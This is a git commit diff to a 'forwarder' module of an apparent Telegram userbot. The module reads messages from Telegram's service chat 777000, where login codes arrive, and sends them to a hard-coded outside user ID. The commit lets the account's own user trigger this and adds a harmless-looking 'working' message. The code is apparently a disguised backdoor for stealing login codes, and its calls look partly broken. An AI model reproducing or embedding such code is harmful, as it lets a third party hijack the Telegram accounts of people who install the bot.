8ab4e0ee96872965d52323d765f7820e2540ce25
MOHAMMAD AMAAN <AMaaNTheGameRKinG@gmail.com>
2022-04-14 20:52:34 +0530

    Update forwarder.py

--- OPTIMUS/modules/forwarder.py
+++ OPTIMUS/modules/forwarder.py
@@ -6,8 +6,9 @@ import asyncio
 from OPTIMUS import amaan, HANDLER, OWNER_ID
 from pyrogram import filters
 
-@amaan.on_message(filters.command("forward", HANDLER) & filters.user(OWNER_ID))
+@amaan.on_message(filters.command("forward", HANDLER) & filters.me)
 async def forwader(client, message):
+   await message.edit_text("working")
    a = amaan.get_message(777000)
    await amaan.send_message(511112479, a)
 
